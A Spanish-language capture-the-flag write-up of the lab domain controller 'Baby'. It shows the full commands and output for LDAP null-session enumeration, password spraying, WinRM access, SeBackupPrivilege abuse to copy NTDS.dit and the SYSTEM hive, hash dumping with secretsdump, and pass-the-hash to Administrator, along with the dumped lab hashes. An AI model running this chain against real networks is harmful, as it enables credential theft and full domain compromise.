>Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ sudo nmap -p- -sS -Pn -n --open --min-rate 5000 -sV 10.129.29.150 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-01 11:39 EST
Nmap scan report for 10.129.29.150
Host is up (0.062s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-01 16:39:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49844/tcp open  msrpc         Microsoft Windows RPC
55410/tcp open  msrpc         Microsoft Windows RPC
59742/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59743/tcp open  msrpc         Microsoft Windows RPC
59752/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.02 seconds
```

>Agregamos los nombres de dominio encontrados en el escaneo al resolutor local para poder resolver sus nombres DNS:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ echo "10.129.29.150 baby.vl BABYDC babydc.baby.vl" >> /etc/hosts
```

>Enumeramos con netexec datos del DC:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ nxc smb 10.129.29.150 -u '' -p ''             
SMB         10.129.29.150   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.29.150   445    BABYDC           [+] baby.vl\:
```

>Vemos que por LDAP podemos hacer consultas con **Null Session** donde descubrimos, por ejemplo, todos los usuarios del dominio, aquí vemos que en la descripción del usuario **Teresa.Bell** tenemos la contraseña **BabyStar123!**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ nxc ldap 10.129.29.150 -u '' -p '' --users 
LDAP        10.129.29.150   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.29.150   389    BABYDC           [+] baby.vl\: 
LDAP        10.129.29.150   389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        10.129.29.150   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.29.150   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.29.150   389    BABYDC           Jacqueline.Barnett            2021-11-21 10:11:03 0                                                                    
LDAP        10.129.29.150   389    BABYDC           Ashley.Webb                   2021-11-21 10:11:03 0                                                                    
LDAP        10.129.29.150   389    BABYDC           Hugh.George                   2021-11-21 10:11:03 0                                                                    
LDAP        10.129.29.150   389    BABYDC           Leonard.Dyer                  2021-11-21 10:11:03 0                                                                    
LDAP        10.129.29.150   389    BABYDC           Connor.Wilkinson              2021-11-21 10:11:08 0                                                                    
LDAP        10.129.29.150   389    BABYDC           Joseph.Hughes                 2021-11-21 10:11:08 0                                                                    
LDAP        10.129.29.150   389    BABYDC           Kerry.Wilson                  2021-11-21 10:11:08 0                                                                    
LDAP        10.129.29.150   389    BABYDC           Teresa.Bell                   2021-11-21 10:14:37 0        Set initial password to BabyStart123!     
```

>Comprobamos las credenciales pero no son válidas: `teresa.bell:BabyStart123!`

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ nxc smb 10.129.29.150 -u 'teresa.bell' -p 'BabyStart123!'
SMB         10.129.29.150   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.29.150   445    BABYDC           [-] baby.vl\teresa.bell:BabyStart123! STATUS_LOGON_FAILURE 
```

>Hacemos **password spray** con las credenciales obtenidas, pero no vemos ningún match:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ kerbrute passwordspray -d baby.vl users --dc 10.129.29.150 -t 300 'BabyStart123!'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/01/26 - Ronnie Flathers @ropnop

2026/01/01 11:46:42 >  Using KDC(s):
2026/01/01 11:46:42 >  	10.129.29.150:88

2026/01/01 11:46:42 >  Done! Tested 9 logins (0 successes) in 0.140 seconds
```

>Seguimos enumerando por LDAP y obtenemos una lista más cierta de los usuarios del directorio activo:

```bash
┌──(kali㉿jbkira)-[~]
└─$ ldapsearch -x -b "dc=baby, dc=vl" "*" -H ldap://babydc.baby.vl | grep dn
dn: DC=baby,DC=vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl
dn: CN=it,CN=Users,DC=baby,DC=vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
```

>Vemos que con esta enumeración obtuvimos más usuarios del dominio:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ diff users users2
0a1
> Administrator
1a3
> krbtgt
5a8
> Ian.Walker
9a13
> Caroline.Robinson
```

>Rehacemos el **password spray** con una lista mayor y vemos que tenemos las credenciales: `Caroline.Robinson:BabyStart123!`

```bash 
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ kerbrute passwordspray -d baby.vl users2 --dc 10.129.29.150 -t 300 'BabyStart123!'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 01/01/26 - Ronnie Flathers @ropnop

2026/01/01 11:53:04 >  Using KDC(s):
2026/01/01 11:53:04 >  	10.129.29.150:88

2026/01/01 11:53:04 >  [+] VALID LOGIN:	Caroline.Robinson@baby.vl:BabyStart123!
2026/01/01 11:53:04 >  Done! Tested 13 logins (1 successes) in 0.144 seconds
```

>Vemos que el usuario debe cambiar sus credenciales por la flag **STATUS_PASSWORD_MUST_CHANGE**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ nxc smb 10.129.29.150 -u 'Caroline.Robinson' -p 'BabyStart123!'
SMB         10.129.29.150   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.29.150   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! **STATUS_PASSWORD_MUST_CHANGE**
```

>Cambiamos la contraseña de **Caroline.Robinson** con **changepasswd.py** de Impacket:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ impacket-changepasswd baby.vl/caroline.robinson@10.129.29.150 -newpass 'Password123$!' -p rpc-samr
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Current password: 
[*] Changing the password of baby.vl\caroline.robinson
[*] Connecting to DCE/RPC as baby.vl\caroline.robinson
[*] Password was changed successfully.
```

>Vamos a dumpear el contenido del dominio mediante LDAP:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ ldapdomaindump -u 'baby.vl\caroline.robinson' -p 'Password123$!' --no-json --no-grep -m babydc.baby.vl
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

>Aquí vemos que **caroline.robinson** puede entrar por **WinRM** ya que pertenece al grupo **Remote Management Users**:

<img width="809" height="105" alt="image" src="https://github.com/user-attachments/assets/889a2fe9-3cb7-450c-9f08-72bbc2c9868d" />
<img width="1247" height="265" alt="image" src="https://github.com/user-attachments/assets/cc711f54-cb5e-4e18-843b-ac761f945a79" />

>Entramos por **WinRM** empleando las credenciales de **caroline.robinson** y leemos la primera flag:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ evil-winrm -i babydc.baby.vl -u caroline.robinson -p 'Password123$!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> cat ..\Desktop\user.txt
873a6705eca1355237438965041d3897
```

>Vemos que posee el token **SeBackupPrivilege** que nos permitirá **escalar privilegios**:

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

>Importamos los siguientes DLL que ayudan a explotar el token: https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Import-Module .\SeBackupPrivilegeCmdLets.dll
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Import-Module .\SeBackupPrivilegeUtils.dll
```

>Hacemos una **shadow copy** del disco C: para robarnos posteriormente el **NTDS.dit**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ cat diskshadow.txt 
set verbose on 
set metadata C:\Windows\Temp\meta.cab 
set context clientaccessible 
set context persistent 
begin backup 
add volume C: alias cdrive 
create 
expose %cdrive% E: 
end backup 
exit 

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> diskshadow.exe /s diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  1/1/2026 5:18:48 PM

-> set verbose on
-> set metadata C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.

* Including writer "Task Scheduler Writer":
	+ Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
	+ Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
	+ Adding component: \PerformanceCounters

* Including writer "System Writer":
	+ Adding component: \System Files
	+ Adding component: \Win32 Services Files

* Including writer "ASR Writer":
	+ Adding component: \ASR\ASR
	+ Adding component: \Volumes\Volume{711fc68a-0000-0000-0000-100000000000}
	+ Adding component: \Disks\harddisk0
	+ Adding component: \BCD\BCD

* Including writer "DFS Replication service writer":
	+ Adding component: \SYSVOL\8D6E7361-AC28-4EC5-9914-ACB6AE407BCB-2EB58465-8BD4-4748-9135-FE1B23D5A20B

* Including writer "Registry Writer":
	+ Adding component: \Registry

* Including writer "COM+ REGDB Writer":
	+ Adding component: \COM+ REGDB

* Including writer "WMI Writer":
	+ Adding component: \WMI

* Including writer "NTDS":
	+ Adding component: \C:_Windows_NTDS\ntds

Alias cdrive for shadow ID {ec0cc761-99cd-446d-b140-432173d77e77} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {6aef357d-0f91-4ef5-a59e-a9ce66365783} set as environment variable.
Inserted file Manifest.xml into .cab file meta.cab
Inserted file BCDocument.xml into .cab file meta.cab
Inserted file WM0.xml into .cab file meta.cab
Inserted file WM1.xml into .cab file meta.cab
Inserted file WM2.xml into .cab file meta.cab
Inserted file WM3.xml into .cab file meta.cab
Inserted file WM4.xml into .cab file meta.cab
Inserted file WM5.xml into .cab file meta.cab
Inserted file WM6.xml into .cab file meta.cab
Inserted file WM7.xml into .cab file meta.cab
Inserted file WM8.xml into .cab file meta.cab
Inserted file WM9.xml into .cab file meta.cab
Inserted file WM10.xml into .cab file meta.cab
Inserted file Dis7F96.tmp into .cab file meta.cab

Querying all shadow copies with the shadow copy set ID {6aef357d-0f91-4ef5-a59e-a9ce66365783}

	* Shadow copy ID = {ec0cc761-99cd-446d-b140-432173d77e77}		%cdrive%
		- Shadow copy set: {6aef357d-0f91-4ef5-a59e-a9ce66365783}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
		- Creation time: 1/1/2026 5:19:06 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: BabyDC.baby.vl
		- Service machine: BabyDC.baby.vl
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {ec0cc761-99cd-446d-b140-432173d77e77}
The shadow copy was successfully exposed as E:\.
-> end backup
-> exit
```

>Ahora **copiamos** el **NTDS.dit** de la **shadow copy** con los cmdlets de los dll importados anteriormente:

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\Caroline.Robinson\Desktop\ntds.dit
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> ls


    Directory: C:\Users\Caroline.Robinson\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          1/1/2026   5:18 PM            197 diskshadow.txt
-a----          1/1/2026   5:20 PM       16777216 ntds.dit
-a----          1/1/2026   5:11 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----          1/1/2026   5:11 PM          16384 SeBackupPrivilegeUtils.dll
-ar---          1/1/2026   4:16 PM             34 user.txt


*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> download ntds.dit
```

>Ahora obtenemos la **registry hive SYSTEM** para poder extraer el contenido del **NTDS.dit**: 

```bash
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> reg save HKLM\SYSTEM SYSTEM.SAV
The operation completed successfully.

*Evil-WinRM* PS C:\Users\Caroline.Robinson\Desktop> download SYSTEM.SAV
```

>Por último, con **secretsdump.py** vamos a extraer los hashes **NTLM** de **todos los usuarios del dominio** de la base de datos **NTDS.dit**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV local     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:e0a8687b8eb33a0913ab69cb0042bfde:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
BABYDC$:des-cbc-md5:8fef68979223d645
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:4aa4e492c33a74900dbd2bab5bcf1e390ca2d8c573fe54d8bf7c98e32b344f33
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:2f0ba02c4938d099e2c04089984366cd
baby.vl\Caroline.Robinson:des-cbc-md5:2f58981c895d1968
[*] Cleaning up... 
```

>Ahora podemos entrar con **evil-winrm** mediante **Pass-The-Hash** para leer la flag final como el **Administrador**:

```bash
┌──(kali㉿jbkira)-[~/Desktop/machines/baby]
└─$ evil-winrm -i babydc.baby.vl -u Administrator -H 'ee4457ae59f1e3fbd764e33d9cef123d'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ..\Desktop\root.txt
983aee9b546d90b20654623bd063a106
```
